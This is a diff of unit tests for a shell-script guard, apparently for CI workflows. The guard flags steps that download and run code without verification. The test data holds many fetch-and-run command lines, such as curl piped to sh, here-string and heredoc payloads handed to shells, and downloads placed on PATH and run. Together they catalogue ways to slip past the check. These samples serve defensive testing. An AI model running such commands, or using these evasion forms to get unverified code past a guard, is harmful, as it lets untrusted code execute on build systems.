+                self.assertIn("inside a command substitution", self.flagged(("run", script)))
+        # One that downloads nothing still may run what the job downloaded,
+        # which the guard does not follow into a substitution; bash runs both.
+        for steps in ((("run", "curl -fsSL -o t.sh https://example.test/i.sh\n"
+                               "x=$(sh -c 'bash t.sh')\n"),),
+                      (("get", "curl -fsSL -o t.sh https://example.test/i.sh\n"),
+                       ("run", "x=$(sh -c '. ./t.sh')\n"))):
+            with self.subTest(steps=steps):
+                self.assertIn("inside a command substitution", self.flagged(*steps))
+        # In a job that downloads nothing, one that fetches nothing and holds
+        # no such form has nothing to check (re-review N-A): these read clean.
+        for script in ("VERSION=$(bash -c 'echo 1')\n", 'OUT=$(sh -c "make -s print-version")\n',
+                       "VERSION=$(bash -ec 'echo 1')\n", 'OUT=$(sh -ec "make -s print-version")\n',
+                       "x=$(bash <<< 'echo hi')\n", "v=$(bash -lc 'node --version')\n",
+                       'echo "$(sudo bash -c \'cat /etc/os-release\')"\n',
+                       "x=`sh -c 'echo 1'`\n", 'h=$(eval echo "~$USER")\n',
+                       "diff <(sh -c 'echo a') <(sh -c 'echo b')\n",
+                       "x=$(bash -s <<'EOF'\necho hi\nEOF)\n"):
+            with self.subTest(script=script):
+                self.accepted(("run", script))
+        # The must-trip controls: outside a substitution, read as before.
+        for script, shell in (('zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)"\n', "bash"),
+                              ("bash <<< '%s'\n" % payload, "sh"), ("sh -c '%s'\n" % payload, "sh")):
+            with self.subTest(script=script):
+                self.assertIn("straight to `%s`" % shell, self.flagged(("run", script)))
+        # No script handed to a shell: nothing to read.
+        for script in ('x=$(jq -r .a <<< "$META")\n', "x=$(cat <<< '%s')\n" % payload,
+                       "x=$(bash x.sh)\n"):
+            with self.subTest(script=script):
+                self.accepted(("run", script))
 
     # the OTHER heredoc spelling (#1839, run-14 SEC-3915165799): a body handed
     # to an interpreter as the PROGRAM it runs, which was neither read nor
@@ -1609,13 +2144,17 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                 self.assertIn("/tmp/p", why)
 
     def test_a_checksum_inside_the_heredoc_script_still_clears_it(self):
-        # The expansion keeps the ORDER, exactly as the `eval` string above:
-        # a step hardened inside its own heredoc comes out hardened.
-        self.accepted(("install", "bash -s <<'EOF'\n"
-                                  "curl -sfL https://example.test/p -o /tmp/p\n"
-                                  'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX +
-                                  "chmod +x /tmp/p\n"
-                                  "EOF\n"))
+        # The expansion keeps the ORDER, exactly as the `sh -c` string above:
+        # a step hardened inside its own heredoc comes out hardened, where
+        # `set -e` makes the checksum stop the script (review I-2).
+        script = ("bash -s <<'EOF'\n%s"
+                  "curl -sfL https://example.test/p -o /tmp/p\n"
+                  'echo "%s  /tmp/p" | sha256sum -c -\n'
+                  "chmod +x /tmp/p\n"
+                  "EOF\n")
+        self.accepted(("install", script % ("set -euo pipefail\n", HEX)))
+        self.assertIn("carries on past its failure",
+                      self.flagged(("install", script % ("", HEX))))
 
     def test_an_expanding_heredoc_script_is_reported_unread(self):
         why = self.flagged(("install", "bash -s <<EOF\n"
@@ -1661,6 +2200,41 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         # the fleet writes, and it must not become a report.
         self.accepted(("tags", "docker buildx imagetools create "
                                "$(jq -cr '.tags' <<< \"$META\")\n"))
+
+    def test_an_interpreters_here_string_program_is_read(self):
+        # #2293: `sh <<< '<script>'` hands the shell its script on stdin, as
+        # `bash -s <<'EOF'` does. Bash 3.2 and 5.2 run the download in each of
+        # these, which the guard read clean; a here-string bash expands first
+        # is reported unread, as an expanding heredoc is, and so is a program
+        # in another language.
+        payload = "curl -fsSL https://example.test/i.sh | sh"
+        for script in ("sh <<< '%s'\n", 'bash -s -- --yes <<< "%s"\n', "zsh <<<'%s'\n",
+                       "sudo sh <<< $'%s'\n", "sh 3<<< '%s' 0<&3\n",
+                       "sh <<< 'echo a' <<< 'echo b\n%s'\n", "eval \"sh <<< '%s'\"\n"):
+            with self.subTest(script=script):
+                why = self.flagged(("install", script % payload))
+                self.assertIn("straight to `sh`", why)
+        for script in ('sh <<< "curl -fsSL $URL | sh"\n', 'bash <<< "$CMD"\n',
+                       "sh <<< $'%s\\n'\n" % payload):
+            with self.subTest(script=script):
+                self.assertIn("EXPANDING", self.flagged(("install", script)))
+        self.assertIn("python3", self.flagged(("install", "python3 <<< 'print(1)'\n")))
+        # The here-string is not the program: another descriptor, a `-c`
+        # string or a script file first, stdin replaced after it -- or no
+        # interpreter at all.
+        for script in ("cat <<< '%s'\n", "sh 3<<< '%s'\n", "sh -c 'cat' <<< '%s'\n",
+                       "bash x.sh <<< '%s'\n", "sh <<< '%s' < /dev/null\n",
+                       'read -r a b <<< "%s"\n'):
+            with self.subTest(script=script):
+                self.accepted(("install", script % payload))
+        # A script hardened inside it comes out hardened where the checksum
+        # stops it: bash 3.2 and 5.2 run /tmp/p with the checksum failing
+        # without the `set -e;`, and not with it (review I-2).
+        checked = ("sh <<< '%scurl -fsSL -o /tmp/p https://example.test/p; "
+                   'echo "%s  /tmp/p" | sha256sum -c -; sh /tmp/p\'\n')
+        self.assertIn("carries on past its failure",
+                      self.flagged(("install", checked % ("", HEX))))
+        self.accepted(("install", checked % ("set -e; ", HEX)))
 
     def test_a_second_heredoc_on_the_line_leaves_the_stdin_script_read(self):
         # #2128: the reader lifted one heredoc per line, so `3<<'B'` after the
@@ -1722,6 +2296,22 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
             wg.Step("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX, None, when),
             wg.Step("flip", 'echo "NEED=no" >> "$GITHUB_ENV"\n'),
             wg.Step("run", "chmod +x /tmp/p\n/tmp/p\n", None, when))
+
+    # 11. a directory on the runner's PATH past `PATH_DIRS`, or one a step
+    # puts there itself (#2308 closed the fixed ones:
+    # `TestADownloadWrittenIntoADirectoryOnPath`; review N-4 named the rest).
+    def test_a_directory_a_step_puts_on_path(self):
+        fetch = ("get", "curl -sfL https://example.test/p -o bin/payload\n")
+        self.accepted(fetch, ("path", 'echo "$PWD/bin" >> "$GITHUB_PATH"\n'),
+                      ("run", "payload --version\n"))
+        self.accepted(fetch, ("run", 'export PATH="$PWD/bin:$PATH"\npayload --version\n'))
+        self.flagged(("get", "curl -sfL https://example.test/p -o /usr/local/bin/payload\n"),
+                     ("run", "payload --version\n"))
+        # ... and the runner image's own directories past `PATH_DIRS` (review
+        # N-4), which bash 3.2 and 5.2 find a bare name in when on PATH.
+        for dest in ('"$HOME/.cargo/bin/payload"', "/snap/bin/payload"):
+            self.accepted(("get", "curl -sfL https://example.test/p -o %s\n" % dest),
+                          ("run", "payload --version\n"))
 
 
 class TestRunSteps(unittest.TestCase):
@@ -2154,9 +2744,15 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                               ("a=1 if a[1<<X]", "X]"), (">/dev/null if a[1<<X]", "X]"),
                               ("echo 2>&1 a[1<<X]", "X]"), ("echo &>/dev/null a[1<<X]", "X]"),
                               ("declare a=(x) b[1<<X]", "X]"), ("coproc c d a[1<<X]", "X]"),
-                              ("\\a[1<<X]", "X]"), ("a[1]x]=y b[1<<X]", "X]")):
+                              ("\\a[1<<X]", "X]")):
             with self.subTest(opening=opening):
                 self.flagged("%s\nit's\n%s\n%s\n" % (opening, word, self.PAYLOAD))
+        # `a[1]x]=y` is no assignment, so it is the command: a pattern bash
+        # globs, reported too (#2294), before the payload the heredoc hid.
+        found = wg.job_defects([("step", "a[1]x]=y b[1<<X]\nit's\nX]\n%s\n" % self.PAYLOAD)])
+        self.assertEqual(2, len(found), found)
+        self.assertIn("`a[1]x]=y` is a pattern", found[0][1])
+        self.assertIn("https://example.test/i.sh", found[1][1])
 
     def test_a_command_double_paren_is_read_as_bash_decides_it(self):
         # Bash matches a command's `((` to the close of its first group --
@@ -2288,11 +2884,11 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
         self.flagged("cat <<EOF\nit's\nEOF\n%s\n" % self.PAYLOAD)
 
     def test_a_text_the_guard_reads_again_is_refused_by_its_step(self):
-        # After every step is read, `_defects` reads the text of each
-        # substitution as a script of its own: a backquote's text, a `$(...)`
-        # in an expanding heredoc body, and a `$( ...)` holding a `((` nest
-        # that the whole step is long enough to read under the cap and the
-        # substitution alone is not. Each raised there, past the step's own
+        # The guard reads the text of each substitution as a script of its
+        # own: a backquote's text, a `$(...)` in an expanding heredoc body,
+        # and a `$( ...)` holding a `((` nest that the whole step is long
+        # enough to read under the cap and the substitution alone is not.
+        # Each raised when `_defects` read it again, past the step's own
         # read, as a traceback naming no step.
         for script, cause in (("echo `echo $(cat <<EOF)`\n", "closes before"),
                               ('cat <<EOF\n$(echo "$(cat <<X)"\n)\nEOF\n', "closes before"),
@@ -2302,11 +2898,13 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                 self.refused(script, cause)
 
     def test_the_job_reads_again_only_what_its_steps_read(self):
-        # `job_defects` catches those per step because its walk -- `read`,
-        # then `_unread_records` -- parses every text `_defects` parses again
-        # job-wide, down the same substitutions. A text only `_defects` parsed
-        # would raise past that catch again. A marker's prefix is minted per
-        # parse, so texts are compared without it.
+        # `job_defects` catches those per step because each step's walk --
+        # `read`, then `_walk` -- is the one read of every text, substitutions
+        # included, and `_defects` is handed that walk's records instead of
+        # reading them again (#2287): a text only `_defects` parsed would
+        # raise past the catch. So the job reads nothing again, and each text
+        # once. A marker's prefix is minted per parse, so texts are compared
+        # without it.
         parsed = []
         job = [False]
         statements, defects = wg.statements, wg._defects
@@ -2322,8 +2920,8 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
             finally:
                 job[0] = False
 
-        # Each text is written in one step only: no other step's walk can
-        # parse it in that step's place.
+        # Each text is written once, in one step only: no other step's walk
+        # can parse it in that step's place.
         steps =[("nested", "echo $(echo $(echo `echo $(true)`))\n"),
                  ("body", 'cat <<EOF\n$(printf "$(id)" `pwd`)\nEOF\n'),
                  ("strings", "eval \"$(echo $(date))\"\nx=$(sh -c 'echo $(uname)')\n"),
@@ -2333,10 +2931,10 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                 mock.patch.object(wg, "_defects", marked):
             found = wg.job_defects(steps)
         self.assertFalse([why for _name, why in found if why.startswith("cannot read this")])
-        per_step = {text for inside, text in parsed if not inside}
-        in_job = {text for inside, text in parsed if inside}
-        self.assertTrue(in_job)
-        self.assertLessEqual(in_job, per_step, in_job - per_step)
+        per_step = [text for inside, text in parsed if not inside]
+        self.assertEqual([], [text for inside, text in parsed if inside])
+        self.assertTrue(per_step)
+        self.assertEqual(sorted(set(per_step)), sorted(per_step))
 
     def test_an_escaped_quote_inside_a_substitution_string(self):
         # COD-3636110933's remainder: `_closing` ended the nested "a\")b" at
